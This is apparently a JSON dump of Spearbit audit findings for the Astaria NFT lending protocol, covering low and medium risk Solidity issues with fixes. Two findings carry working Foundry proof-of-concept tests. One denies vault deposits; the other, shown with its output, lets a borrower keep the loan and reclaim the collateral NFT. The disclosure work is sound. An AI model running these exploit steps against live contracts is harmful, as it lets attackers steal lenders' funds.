      "content": "## Severity: Low Risk\n\n## Context\n- `CollateralToken.sol#L437-L447`\n\n## Description\nSince the CollateralToken positions can be sold on secondary markets like OpenSea, the `tokenURI` endpoint should be customized to avoid misleading users. It should contain information relating to the CollateralToken and not just its underlying asset. It would also be great to pull information from its associated lien to include here.\n- What is OpenSea's copymint policy?\n- [OpenSea Metadata Standards Documentation](https://docs.opensea.io/docs/metadata-standards)\n- Necromint got banned on OpenSea.\n\n## Recommendation\nDefine/design a customised `tokenURI` for CollateralToken.\n\n### Astaria\nOpenSea has approved previous versions, though we are planning to introduce a customized image. Fixed in PR 340 by introducing web2 endpoints for these queries.\n\n### Spearbit\nFixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21862",
      "title": "CollateralToken 's conduit would have an open channel to an old Seaport when Seaport is updated",
      "impact": "LOW",
      "content": "## Low Risk Severity Report\n\n## Context\n- **File:** CollateralToken.sol  \n- **Lines:** 343-365\n\n## Description\nAfter filing for a new Seaport, the old Seaport would still have an open channel to it from the CollateralToken's conduit (assuming the old and new Seaport share the same conduit controller).\n\n## Recommendation\nIt might be best to close the channel to the old Seaport in the same filing call.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21861",
      "title": "Updated ...EpochLength values are not validated",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- **File**: AstariaRouter.sol\n- **Lines**: L319-L322\n\n## Description\nSanity check is missing for updated `s.minEpochLength` and `s.maxEpochLength`. Need to make sure `s.minEpochLength <= s.maxEpochLength`.\n\n## Recommendation\nMake sure the updated values still hold the above invariant.\n\n## Status\n- **Astaria**: Fixed in PR 345.\n- **Spearbit**: Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21860",
      "title": "Native tokens sent to DepositHelper can get locked",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity: Low Risk\n\n### Context:\n- `DepositHelper.sol#L43-L45`\n\n### Description:\nDepositHelper has the following two endpoints:\n```solidity\nfallback() external payable {}\nreceive() external payable {}\n```\nIf one calls this contract by not supplying the `deposit(...)` function signature, the `msg.value` provided would get locked in this contract.\n\n### Recommendation:\nIf there isn't a plan to update this contract to use its own balance, it would be great to remove these endpoints:\n- `fallback() external payable {}`\n- `receive() external payable {}`\n\n### Audits:\n- **Astaria:** Fixed in PR 334.\n- **Spearbit:** Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21859",
      "title": "Loan duration can be reduced at the time of borrowing without user permission",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nAstariaRouter.sol#L889\n\n## Description\nRequested loan duration, if greater than the maximum allowed duration (the time to next epoch's end), is set to this maximum value:\n\n```solidity\nif (timeToSecondEpochEnd < lien.details.duration) {\n    lien.details.duration = timeToSecondEpochEnd;\n}\n```\n\nThis happens without explicit user permission.\n\n## Recommendation\nConsider reverting in this case to avoid any surprises for the borrower. If no changes are made, this behavior should be documented for awareness.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21858",
      "title": "Several functions in AstariaRouter can be made non-payable",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `AstariaRouter.sol#L118-L173`\n- `AstariaRouter.sol#L202`\n\n## Description\nFollowing functions in `AstariaRouter` are payable when they should never be sent the native token:\n- `mint()`\n- `deposit()`\n- `withdraw()`\n- `redeem()`\n- `pullToken()`\n\n## Recommendation\nRemove the payable keyword for the highlighted functions.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21857",
      "title": "VaultImplementation.init(...) silently initialised when the allowlist parameters are not throughly",
      "impact": "LOW",
      "content": "## Validated\n\n**Severity:** Low Risk\n\n## Context\n- VaultImplementation.sol#L183-L192\n\n## Description\nIn `VaultImplementation.init(...)`, if `params.allowListEnabled` is false but `params.allowList` is not empty, `s.allowList` does not get populated.\n\n## Recommendation\nIt might be best to check the above scenario and, in the case it is detected, to revert the transaction.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21856",
      "title": "Inconsistent Vault Fee Charging during Loan Liquidation via WithdrawProxy",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `WithdrawProxy.sol#L288-L337`\n- `PublicVault.sol#L553-L569`\n\n## Description\nIn the smart contract code of `PublicVault`, there is an inconsistency related to the charging of fees when a loan is liquidated at epoch's roll and the lien is sent to `WithdrawProxy`. The `PublicVault.owner` is supposed to take a ratio of the interest paid as the strategist's reward, and the fee should be charged when a payment is made in the function `PublicVault.updateVault(...)`, regardless of whether it's a normal payment or a liquidation payment.\n\nIt appears that the fee is not being charged when a loan is liquidated at epoch's roll and the lien is sent to `WithdrawProxy`. This discrepancy could potentially lead to an inconsistent distribution of fees and rewards.\n\n## Recommendation\nHandle strategist reward fee in `WithdrawProxy.claim(...)`.\n\n## Acknowledgements\n- **Astaria:** Acknowledged.\n- **Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21855",
      "title": "PublicVault does not handle funds in errorReceiver",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nLienToken.sol#L392-L430\n\n## Description\nDuring loan repayment in the function `LienToken.MakePayment(...)`, the process involves `LienToken` attempting to pull tokens from the user using `transferProxy.TRANSFER_PROXY.tokenTransferFromWithErrorReceiver`. The implementation in the `TransferProxy` contract involves sending the tokens to an error receiver that is controlled by the original receiver. However, this approach can lead to accounting errors in the `PublicVault` as `PublicVault` does not pull tokens from the error receiver.\n\n```solidity\nfunction tokenTransferFromWithErrorReceiver(\n    // ...\n) {\n    try ERC20(token).transferFrom(from, to, amount) {} catch {\n        _transferToErrorReceiver(token, from, to, amount);\n    }\n}\n```\n\nNote that, in practice, tokens would not be transferred to the error receiver. The issue is hence considered to be a low-risk issue.\n\n## Recommendation\nUse `TRANSFER_PROXY.tokenTransferFrom` instead of `transferProxy.TRANSFER_PROXY.tokenTransferFromWithErrorReceiver`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21854",
      "title": "Error handling for USDT transactions in TransferProxy",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nTransferProxy.sol#L74C1-L85\n\n## Description\nTo handle edge cases where the receiver is blacklisted, `TransferProxy.tokenTransferFromWithErrorReceiver(...)` is designed to catch errors that may occur during the first transfer attempt and then proceed to send the tokens to the error receiver.\n\n```solidity\ntry ERC20(token).transferFrom(from, to, amount) {} catch {\n    _transferToErrorReceiver(token, from, to, amount);\n}\n```\n\nHowever, it's worth noting that this approach may not be compatible with non-standard ERC20 tokens (e.g., USDT) that do not return any value after a `transferFrom` operation. The try-catch pattern in Solidity can only catch errors resulting from reverted external contract calls, but it does not handle errors caused by inconsistent return values. Consequently, when using USDT, the entire transaction will revert.\n\n## Recommendation\nWe can make a slight modification to the `safeTransferLib` to handle reverts from external contract calls while remaining compatible with USDT.\n\n```solidity\nfunction trySafeTransferFrom(\n    ERC20 token,\n    address from,\n    address to,\n    uint256 amount\n) internal returns(bool success) {\n    assembly {\n        // Get a pointer to some free memory.\n        let freeMemoryPointer := mload(0x40)\n        // Write the abi-encoded calldata into memory, beginning with the function selector.\n        mstore(freeMemoryPointer, 0x23b872dd00000000000000000000000000000000000000000000000000000000)\n        mstore(add(freeMemoryPointer, 4), from) // Append the \"from\" argument.\n        mstore(add(freeMemoryPointer, 36), to) // Append the \"to\" argument.\n        mstore(add(freeMemoryPointer, 68), amount) // Append the \"amount\" argument.\n        success := and(\n            // Set success to whether the call reverted, if not we check it either\n            // returned exactly 1 (can't just be non-zero data), or had no return data.\n            or(and(eq(mload(0), 1), gt(returndatasize(), 31)), iszero(returndatasize())),\n            // We use 100 because the length of our calldata totals up like so: 4 + 32 * 3.\n            // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.\n            // Counterintuitively, this call must be positioned second to the or() call in the\n            // surrounding and() call or else returndatasize() will be zero during the computation.\n            call(gas(), token, 0, freeMemoryPointer, 100, 0, 32)\n        )\n    }\n    // Do not revert the transaction when it fails. Return the state instead.\n    // require(success, \"TRANSFER_FROM_FAILED\");\n}\n```\n\n```solidity\nfunction tokenTransferFromWithErrorReceiver(\n    address token,\n    address from,\n    address to,\n    uint256 amount\n) external requiresAuth {\n    if (!trySafeTransferFrom(token, from, to, amount)) {\n        _transferToErrorReceiver(token, from, to, amount);\n    }\n}\n```\n\nPlease note that this approach may reduce the codebase's readability. Consider whether you want to support edge cases where the receiver is blacklisted.\n\n## Astaria\nFixed in PR 339.\n\n## Spearbit\nVerified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21853",
      "title": "Borrower can borrow more than totalAssets from PublicVault",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n`PublicVault.sol#L468-L495`\n\n## Description\nPresently, the PublicVault contract lacks a mechanism to keep track of the total borrow amount within the contract. As a result, it does not trigger a revert when the borrowed amount exceeds the available `totalAssets`. This creates a peculiar edge case where a user can transfer tokens to the PublicVault and proceed to borrow an amount greater than the `totalAssets`. Consequently, the PublicVault enters an \"overborrowed loan\" scenario.\n\nFor instance, assuming the total asset of a PublicVault is 100 ETH, a user can transfer 200 ETH into the PublicVault and then take out a 200 ETH loan. This \"donated loan\" has several implications:\n\n- It increases the yield of all vault LP participants.\n- It serves as a buffer for the Vault when LP participants redeem their shares.\n\nHowever, this donated loan also poses challenges for the LP:\n\n- LP has no means to redeem the donated LP as it does not alter the total assets.\n- In the event the donated loan is liquidated, the vault LP participants will bear the liability. Assuming the donated loan is liquidated with a 50 ETH deficit, the Vault will be cut by 50 ETH.\n\nThe absence of proper validation and handling of such donated loans may lead to unfair situations and unintended consequences, affecting both the protocol's health and the interests of LP participants. A malicious actor can potentially DOS the vault as a first borrower.\n\nThe borrower can borrow a loan when `totalAssets` is equal to 0. The first borrower can do the following things to DOS the vault. Assume a PublicVault that charges a protocol fee:\n\n1. Transfer a small WETH balance to the PublicVault.\n2. Borrow a dust amount from the PublicVault.\n3. Borrow a small WETH balance.\n4. Repay the dust loan. The protocol fee being charged is very small. `publicVault._handleStrategistInterestReward(...)` mints vault shares to the owner. The `publicVault.totalSupply` becomes very small while the interests of the second loan keep accruing. The vault price (`totalAssets / totalSupply`) becomes large.\n5. The following depositor would not be able to deposit.\n\nThe attack described in the paragraph does not lead to a profitable attack nor does it pose threats to real users. However, it does show that borrowing amounts larger than `totalAssets` can lead to weird states that haven't been well studied. This is a potential issue that should be investigated further if we allow borrowing when `totalAssets` is equal to 0.\n\n## Testing Code\n```solidity\nforge test --mt testBypassMinDeposit --ffi\nfunction testFirstBorrowerAttack() public {\n    TestNFT nft = new TestNFT(3);\n    address tokenContract = address(nft);\n    uint256 tokenId = uint256(1);\n    uint256 tokenId2 = uint256(2);\n\n    // @audit: create a public vault that charges vaultFee\n    address payable publicVault = _createPublicVault({\n        strategist: strategistOne,\n        delegate: strategistTwo,\n        epochLength: 14 days,\n        vaultFee: 10e17\n    });\n\n    // Donated a fraction of assets into the vault\n    WETH9.deposit{value: 1 ether}();\n    WETH9.transfer(publicVault, 1 ether);\n    (, ILienToken.Stack memory stack) = _commitToLien({\n        vault: payable(publicVault),\n        strategist: strategistOne,\n        strategistPK: strategistOnePK,\n        tokenContract: tokenContract,\n        tokenId: tokenId,\n        lienDetails: standardLienDetails,\n        amount: 1000000\n    });\n    ILienToken.Details memory lienDetails = standardLienDetails;\n    lienDetails.maxAmount = 100 ether;\n    (, ILienToken.Stack memory stack2) = _commitToLien({\n        vault: payable(publicVault),\n        strategist: strategistOne,\n        strategistPK: strategistOnePK,\n        tokenContract: tokenContract,\n        tokenId: tokenId2,\n        lienDetails: lienDetails,\n        amount: 1 ether - 1000000\n    });\n    vm.warp(block.timestamp + 30);\n    REPAYMENT_HELPER.makePayment{value: 2000000 ether}(stack);\n    assertEq(PublicVault(publicVault).totalSupply(), 1); // totalSupply == 1.\n    vm.warp(block.timestamp + 1 days);\n    // totalAsset accrues while the total supply is 1 wei\n    WETH9.deposit{value: 100 ether}();\n    WETH9.approve(address(TRANSFER_PROXY), 100 ether);\n    vm.expectRevert(\"VALUE_TOO_SMALL\");\n    ASTARIA_ROUTER.depositToVault(\n        PublicVault(payable(publicVault)),\n        address(msg.sender),\n        100 ether,\n    );\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21852",
      "title": "An owner might not be able to cancel all signed liens by calling incrementNonce()",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- **File**: VaultImplementation.sol\n- **Lines**: L87-L94\n\n## Description\nIf the vault owner or the delegate is phished into signing terms with consecutive nonces in a big range, they would not be able to cancel all those terms with the current `incrementNonce()` implementation as this value is only incrementing the nonce one at a time.\n\nAs an example, Seaport increments their counters using the following formula:\n\n```\nn += blockhash(block.number - 1) << 0x80;\n```\n\n## Recommendation\nIt might be best to implement a similar nonce update like Seaport to avoid this issue.\n\n## References\n- **Astaria**: Recommendation applied in PR 314.\n- **Spearbit**: Fixed.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21851",
      "title": "A malicious collateralized NFT token can block liquidation and also epoch processing for public vaults",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- CollateralToken.sol#L523-L526\n- PublicVault.sol#L353-L357\n\n## Description\nWhen a lien gets liquidated, the `CollateralToken` tries to create a Seaport auction for the underlying token. One of the steps in this process is to give approval for the token id to the `CollateralToken`'s conduit:\n\n```solidity\nERC721(orderParameters.offer[0].token).approve(\n    s.CONDUIT,\n    orderParameters.offer[0].identifierOrCriteria\n);\n```\n\nA malicious/compromised `ERC721(orderParameters.offer[0].token)` can take advantage of this step and revert the `approve(...)`. There are few consequences for this, with the last being the most important one:\n\n1. One would not be able to liquidate the expired lien.\n2. Because of 1, the epoch processing for a corresponding public vault will be halted, since one can only process the current epoch if all of its open liens are paid for or liquidated:\n   ```solidity\n   if (s.epochData[s.currentEpoch].liensOpenForEpoch > 0) {\n       revert InvalidVaultState(InvalidVaultStates.LIENS_OPEN_FOR_EPOCH_NOT_ZERO);\n   }\n   ```\n\n### Recommendations\n1. The strategist or the public vault owner/delegate needs to make sure to only sign roots of the trees with the leaves such that their corresponding ERC721 tokens have been thoroughly checked to ensure they will not be able to revert the approve call.\n2. Alternatively, one can move the approval to the conduit step when a lien is committed to/opened. This way, if the call reverts, a lien is not created, so the epoch processing for the public vault would not be halted. This comes with some risks, as the conduit would hold the token approval for a longer period compared to the current implementation where it only has the approval during the liquidation phase.",
      "summary": "\nThis bug report discusses a vulnerability in the CollateralToken and PublicVault contracts. When a lien is liquidated, the CollateralToken attempts to create a Seaport auction for the underlying token. During this process, the CollateralToken sends an approval to the ERC721 token, which could be malicious or compromised. If the approval call reverts, the lien cannot be liquidated, and the epoch processing for the public vault is halted. \n\nTo mitigate this vulnerability, the strategist or public vault owner/delegate should ensure that the ERC721 tokens have been checked to make sure they won't revert the approval call. Alternatively, the approval could be moved to the conduit step when a lien is committed or opened, so that if the call reverts, the lien is not created. This comes with some risks, as the conduit would hold the token approval for a longer period than the current implementation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21850",
      "title": "If the auction window is 0, the borrower can keep the lien amount and also take back its collateralised NFT token",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- AstariaRouter.sol#L300-L302\n- CollateralToken.sol#L527\n- seaport-core/src/lib/OrderValidator.sol#L677\n- seaport-core/src/lib/Verifiers.sol#L58\n\n## Description\nIf an authorised entity would file to set the `auctionWindow` to 0, borrowers can keep their lien amount and also take back their collateralised NFT tokens. Below is how this type of vulnerability works:\n\n1. A borrower takes a lien from a vault by collateralising its NFT token.\n2. The borrower lets time pass so that their lien/stack position can be liquidated.\n3. The borrower atomically liquidates and then calls the `liquidatorNFTClaim(...)` endpoint of the CollateralToken.\n\nThe timestamps are as follows:\n- \\( tlien_s \\) \n- \\( tlien_e = tauction_s = tauction_e \\)\n\nWe should note that in step 3 above, when the borrower liquidates their own position, the CollateralToken creates a Seaport auction by calling its `validate(...)` endpoint. However, this endpoint does not validate the orders' timestamps, so even though the timestamps provided are not valid, one cannot fulfill/match the order since Seaport requires that \\( tauction_s ≤ tnow < tauction_e \\). Thus, it is not possible to fulfill/match an order where \\( tauction_s = tauction_e \\). Therefore, in step 3, it is not necessary to call `liquidatorNFTClaim(...)` immediately as the auction created cannot be fulfilled by anyone.\n\n## Test Case\n// Add the following test case to\n// file: `src/test/LienTokenSettlementScenarioTest.t.sol`\n\n```solidity\nfunction _createUser(uint256 pk, string memory label) internal returns(address addr) {\n    uint256 ownerPK = uint256(pk);\n    addr = vm.addr(ownerPK);\n    vm.label(addr, label);\n}\n\nfunction testScenario14() public {\n    {\n        // Allow flash liens - liens that can be liquidated in the same block that was committed\n        IAstariaRouter.File[] memory files = new IAstariaRouter.File[](1);\n        files[0] = IAstariaRouter.File(\n            IAstariaRouter.FileType.AuctionWindow,\n            abi.encode(uint256(0))\n        );\n        ASTARIA_ROUTER.fileBatch(files);\n        console2.log(\"[+] set auction window to 0.\");\n    }\n    \n    {\n        address borrower1 = _createUser(0xb055033501, \"borrower1\");\n        address vaultOwner = _createUser(0xa77ac3, \"vaultOwner\");\n        address publicVault = _createPublicVault(vaultOwner, vaultOwner, 14 days);\n        vm.label(publicVault, \"publicVault\");\n        console2.log(\"[+] public vault is created: %s\", publicVault);\n        console2.log(\"vault start: %s\", IPublicVault(publicVault).START());\n        \n        skip(14 days);\n        \n        _lendToVault(\n            Lender({addr: vaultOwner, amountToLend: 10 ether}),\n            payable(publicVault)\n        );\n        \n        TestNFT nft1 = new TestNFT(1);\n        address tokenContract1 = address(nft1);\n        uint256 tokenId1 = uint256(0);\n        nft1.transferFrom(address(this), borrower1, tokenId1);\n        \n        vm.startPrank(borrower1);\n        (uint256 lienId, ILienToken.Stack memory stack) = _commitToLien({\n            vault: payable(publicVault),\n            strategist: vaultOwner,\n            strategistPK: 0xa77ac3,\n            tokenContract: tokenContract1,\n            tokenId: tokenId1,\n            lienDetails: ILienToken.Details({\n                maxAmount: 2 ether,\n                rate: 1e8,\n                duration: 1 hours,\n                maxPotentialDebt: 0 ether,\n                liquidationInitialAsk: 10 ether\n            }),\n            amount: 2 ether,\n            revertMessage: \"\"\n        });\n        \n        console2.log(\"ETH balance of the borrower: %s\", borrower1.balance);\n        skip(1 hours);\n        console2.log(\"[+] lien created with 0 duration. lineId: %s\", lienId);\n        OrderParameters memory params = _liquidate(stack);\n        console2.log(\"[+] lien liquidated by the borrower.\");\n        \n        COLLATERAL_TOKEN.liquidatorNFTClaim(\n            stack,\n            params,\n            COLLATERAL_TOKEN.SEAPORT().getCounter(address(COLLATERAL_TOKEN))\n        );\n        \n        console2.log(\"[+] liquidator/borrower claimed NFT.\\n\");\n        vm.stopPrank();\n        \n        console2.log(\"owner of the NFT token: %s\", nft1.ownerOf(tokenId1));\n        console2.log(\"ETH balance of the borrower: %s\", borrower1.balance);\n        assertEq(\n            nft1.ownerOf(tokenId1),\n            borrower1,\n            \"the borrower should own the NFT\"\n        );\n        assertEq(\n            borrower1.balance,\n            2 ether,\n            \"borrower should still have the lien amount.\"\n        );\n    }\n}\n```\n\n## Output\n```\nforge t --mt testScenario14 --ffi -vvv :\n[+] set auction window to 0.\n[+] public vault is created: 0x4430c0731d87768Bf65c60340D800bb4B039e2C4\nvault start: 1\nETH balance of the borrower: 2000000000000000000\n[+] lien created with 0 duration. lineId: 91310819262208864484407122336131134788367087956387872647527849353935417268035\n[+] lien liquidated by the borrower.\n[+] liquidator/borrower claimed NFT.\nowner of the NFT token: 0xA92D072d39E6e0a584a6070a6dE8D88dfDBae2C7\nETH balance of the borrower: 2000000000000000000\n```\n\n## Recommendation\nMake sure `auctionWindow` cannot be set to 0 by anyone. Additionally, it might be best to define a hardcoded lower bound and ensure `auctionWindow` cannot be set lower than that value.",
      "summary": "\nThis bug report is about a vulnerability that allows borrowers to keep their lien amount and also take back their collateralised NFT tokens if an authorised entity would file to set the auctionWindow to 0. The vulnerability works in the following way: a borrower takes a lien from a vault by collateralising its NFT token, letting the time pass so that its lien/stack position can be liquidated, and then calling the liquidatorNFTClaim(...) endpoint of the CollateralToken. The vulnerability is due to the fact that the validate(...) endpoint does not validate the orders timestamps, so even though the timestamps provided are not valid, it is not possible to fulfil/match an order where tauction s = tauction e. Thus, the borrower can call liquidatorNFTClaim(...) and take back its NFT token.\n\nThe recommendation is to make sure auctionWindow cannot be set to 0 by anyone and to define a hard coded lower bound and make sure auctionWindow cannot be set lower than that value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21849",
      "title": "validateOrder(...) does not check the consideration amount against its token balance",
      "impact": "MEDIUM",
      "content": "## Severity: Medium Risk\n\n## Context\n- CollateralToken.sol#L158\n\n## Description\nWhen a lien position gets liquidated, the CollateralToken creates a full restricted Seaport auction with itself as both the offerer and the zone. This will cause Seaport to do a callback to the CollateralToken's `validateOrder(...)` endpoint at the end of order fulfillment/matching. In this endpoint, we have:\n\n```solidity\nuint256 payment = zoneParameters.consideration[0].amount;\n```\n\nThis payment amount is not validated.\n\n## Recommendation\nMake sure:\n1. `ERC20(zoneParameters.consideration[0].token).balanceOf(CollateralToken)` is at least the payment amount.\n2. Inherit from `seaport-core/../AmountDeriver` and call `_locateCurrentAmount(...)` and derive the correct amount based on the start/end timestamp/amounts and compare to payment.\n\n## Astaria\nFixed in PR 337.\n\n## Spearbit\nFixed.",
      "summary": "\nThis bug report is about a medium risk issue found in the CollateralToken.sol file. When a lien position is liquidated, the CollateralToken creates a full restricted Seaport auction with itself as both the offerer and the zone. This will cause Seaport to call the CollateralToken's validateOrder(...) endpoint at the end of order fulfilment/matching. The payment amount in this endpoint is not validated. To fix this issue, two recommendations were made: 1) Make sure the ERC20 token's balanceOf(CollateralToken) is at least the payment amount, and 2) Inherit from seaport-core/../AmountDeriver and call _locateCurrentAmount(...) and derive the correct amount based on the start/end timestamp/amounts and compare to payment. The issue has been fixed in PR 337 and Spearbit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Astaria",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Astaria-Spearbit-Security-Review-July.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Saw-Mon and Natalie",
        "Jonah1005",
        "Blockdev"
      ]
    },
    {
      "id": "21848",
      "title": "The risk of bad debt is transferred to the non-redeeming shareholders and not the redeeming holders",
      "impact": "MEDIUM",
      "content": "## Medium Risk Report\n\n## Context\n- **File:** PublicVault.sol\n- **Lines:** L373-L379, L411\n\n## Description\nRight before a successful `epochProcess()`, the total assets \\( A \\) equals to:\n\n\\[ A = y_0 + s(t - t_{\\text{last}}) = B + X \\]\n\nWhere:\n\n- \\( s \\) is the slope: \\( s = 2U_1a(s,t) + P \\)\n- \\( (s,t) \\) refers to \\( 2U_2a(s,t) \\)\n\nAll the parameter values in the table below are considered as just before calling the `processEpoch()` endpoint unless stated otherwise.\n\n| Parameter | Description |\n|-----------|-------------|\n| \\( A \\) | `totalAssets()` |\n| \\( y_0 \\) | `yIntercept` |\n| \\( s \\) | slope |\n| \\( t_{\\text{last}} \\) | last timestamp used to update \\( y_0 \\) or \\( s \\) |\n| \\( t \\) | `block.timestamp` |\n| \\( B \\) | `ERC20(asset()).balanceOf(PublicVault)` (underlying balance of the public vault) |\n| \\( U_1 \\) | The set of active liens/stacks owned by the PublicVault (can be non-empty due to lien duration) |\n| \\( U_2 \\) | The set of liquidated liens/stacks and their corresponding liquidation timestamp \\( t_l \\) owned by the current epoch's `WithdrawProxy` \\( W_{\\text{curr}} \\) (belong to the current epoch, auction ends in the next epoch duration) |\n| \\( a(s,t) \\) | total amount owned by the stack up to timestamp \\( t \\) |\n| \\( S \\) | `totalSupply()` |\n| \\( SW \\) | number of shares associated with the current epoch's `WithdrawProxy`: `currentWithdrawProxy.totalSupply()` |\n| \\( E \\) | `currentWithdrawProxy.getExpected()` |\n| \\( w_r \\) | withdraw reserve value after calling `epochProcess()` |\n| \\( y_{0}' \\) | `yIntercept` after calling `epochProcess()` |\n| \\( t_p \\) | last timestamp after calling `epochProcess()` |\n| \\( A_0 \\) | totalAssets after calling `epochProcess()` |\n| \\( W_n \\) | the current epoch's `WithdrawProxy` before calling `epochProcess()` |\n| \\( W_{n+1} \\) | the current epoch's `WithdrawProxy` after calling `epochProcess()` |\n\nAlso, assume that `claim()` was already called on the previous epoch's `WithdrawProxy` if needed.\n\n### After the Call to `epochProcess()`\nIn the same block, we would have roughly (not considering the division errors):\n\n\\[ A_0 = y_{0}' + s(t - t_p) \\]\n\\[ A_0 = \\left( 1 - \\frac{SW}{S} \\right) A + X + s \\cdot 2U_1 \\left( a(s,t) - a(s,t_p) \\right) \\]\n\\[ w_r = \\left( \\frac{SW}{S} \\right) B + X + s \\cdot 2U_1a(s,t_p) \\]\n\\[ A = A_0 + w_r + \\left( \\frac{SW}{S} \\right) X + (s,t_l) \\cdot 2U_2a(s,t_l) 